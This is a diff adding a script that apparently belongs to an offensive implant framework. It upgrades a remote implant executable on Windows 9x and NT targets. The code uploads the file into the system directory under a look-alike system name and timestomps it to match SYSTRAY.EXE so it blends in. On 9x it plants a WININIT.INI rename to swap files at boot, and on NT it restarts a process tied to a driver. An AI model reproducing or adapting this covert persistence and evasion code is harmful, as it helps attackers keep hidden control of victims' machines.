@@ -1,0 +1,222 @@
+#-------------------------------------------------------------------------------
+# File: UpgradeExe.eps
+# Description: Performs a level4 upgrade for the exe version
+#
+# Modifications:
+#	08/07/03	Created
+#-------------------------------------------------------------------------------
+@echo off;
+
+@include "_FileExists.epm";
+@include "_GetDirectory.epm";
+@include "_GetSystemPaths.epm";
+@include "_ProcessList.epm";
+@include "_VersionChecks.epm";
+
+string $driver = "pdresy";
+
+if ($argc != 6) {
+    echo "Usage: $argv[0] <localFile> <remoteName> <matchFile> <notused1> <tempOldName>";
+    return false;
+}
+
+string $localFile = $argv[1];
+string $remoteName = $argv[2];
+string $matchFile = $argv[3];
+# argv[4]
+string $tempOldName = $argv[5];
+
+if (_IsTargetNtFamily()) {
+
+    # NT Family
+    return UpgradeOnNt($localFile, $remoteName, $matchFile, $tempOldName);
+    
+} else {
+
+    # 9x Family
+    return UpgradeOn9x($localFile);
+
+}
+
+#-----------------------------------------------------------------------------------------------
+sub UpgradeOn9x(IN string $localFile)
+{
+
+    # 9x family -- uses hard-coded names
+    string $remoteName = "NETWRN.EXE";
+    string $matchFile = "SYSTRAY.EXE";
+    string $existingName = "NETWR.EXE";
+
+    # NOTE: We do not upgrade the driver on a 9x system
+
+    string $system;
+    string $root;
+    ifnot (_GetSystemPaths($root, $system)) {
+	echo "* Unable to get system directory";
+	return false;
+    }
+
+    # upload new exe
+    echo "Uploading new exe";
+    if (`put "$localFile" -name "$root\\$system\\$remoteName" -permanent`) {
+	echo "    UPLOADED";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    # match file times for new exe
+    echo "Matching file time for EXE";
+    if (`matchtimes "$root\\$system\\$matchFile" "$root\\$system\\$remoteName"`) {
+	echo "    SUCCESS";
+    } else {
+	echo "    FAILED (but continuing anyway)";
+    }
+    
+    # get old process id
+    int $id;
+    _FindProcessOnList($remoteName, $id);
+
+    echo "Starting executable";
+    if (`run -command "$root\\$system\\$remoteName"`) {
+	echo "    SUCCESS";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    # create the WININIT.INI file for the exe moves
+    string $iniFile;
+    ifnot (_GetLpLogsDirectory($iniFile)) {
+	echo "* Failed to get log directory for WININIT.INI file.  Unable to mark files for move";
+	return false;
+    }
+
+    # remove any previous local instance of the ini file
+    `local del PC_UPGRADE_WININIT.INI -path "$iniFile"`;
+
+    # write the deletion file
+    bool $writeOfIni = true;
+    echo "Writing wininit.ini file for file moves";
+    $iniFile = "$iniFile\\PC_UPGRADE_WININIT.INI";
+    ifnot (WriteFile($iniFile, false, "\r\n[rename]")) {
+	$writeOfIni = false;
+    } else ifnot (WriteFile($iniFile, true, "NULL=$root\\$system\\$existingName")) {
+	$writeOfIni = false;
+    } else ifnot (WriteFile($iniFile, true, "$root\\$system\\$existingName=$root\\$system\\$remoteName")) {
+	$writeOfIni = false;
+    }
+
+    if ($writeOfIni == true) {
+	echo "    SUCCESS";
+	
+	# check for existance
+	if (_FileExists("WININIT.INI", $root)) {
+	    echo "*** $root\\WININIT.INI already exists. ***";
+	    echo "";
+	    echo "Add lines in $iniFile to $root\\WININIT.INI by hand";
+	    return false;
+	} else {
+	    # upload ini file
+	    echo "Uploading WININIT.INI";
+	    if (`put "$iniFile" -name "$root\\WININIT.INI" -permanent`) {
+		echo "    UPLOADED";
+	    } else {
+		echo "    FAILED";
+		echo "";
+		echo "*** Mark files for deletion by hand ***";
+		return false;
+	    }
+	}
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    return true;
+
+}
+# END UpgradeOn9x
+
+#-----------------------------------------------------------------------------------------------
+sub UpgradeOnNt(IN string $localFile, IN string $remoteName, IN string $matchFile, IN string $tempOldName)
+{
+
+    string $driver = "pdresy";
+
+    string $system;
+    string $root;
+    ifnot (_GetSystemPaths($root, $system)) {
+	echo "* Unable to get system directory";
+	return false;
+    }
+
+    # move old exe
+    echo "Moving old exe to temp name ($root\\$system\\$tempOldName)";
+    if (`move "$root\\$system\\$remoteName" "$root\\$system\\$tempOldName"`) {
+	echo "    MOVED";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    # upload new exe
+    echo "Uploading new exe";
+    if (`put "$localFile" -name "$root\\$system\\$remoteName" -permanent`) {
+	echo "    UPLOADED";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    # match file times for new exe
+    echo "Matching file time for EXE";
+    if (`matchtimes "$root\\$system\\$matchFile" "$root\\$system\\$remoteName"`) {
+	echo "    SUCCESS";
+    } else {
+	echo "    FAILED (but continuing anyway)";
+    }
+
+    int $id;
+    bool $started = false;
+
+    @record on;
+    echo "Getting old process id";
+    if (`dp_getprocessid -name $driver`) {
+	$id = GetCmdData("id");
+	if (defined($id) && ($id != 0)) {
+	    echo "    SUCCESS (id = $id)";
+	
+	    # clear the old process
+	    `dp_clearprocessid -name $driver`;
+	
+	    # start the new process
+	    echo "Starting new exe";
+	    if (`dp_restartprocess -name $driver`) {
+		echo "    SUCCESS";
+		$started = true;
+	    } else {
+		echo "    FAILED";
+	    }	    
+	} else {
+	    echo "    FAILED (Unable to determine old process id)";
+	}
+    } else {
+	echo "    FAILED (unable to get old process id)";
+    }
+
+    echo "";
+    if ($started) {
+	echo "New exe is started.";
+	echo "";
+	echo "Verify new PC is running correctly";
+	echo "    and then *** terminate and delete old one by hand ***";
+	echo "    (old process id = $id[0])";
+	return true;
+    } else {
+	echo "New exe is NOT running -- cleanup must be done by hand";
+	return false;
+    }
+
+}
+# END UpgradeOnNt
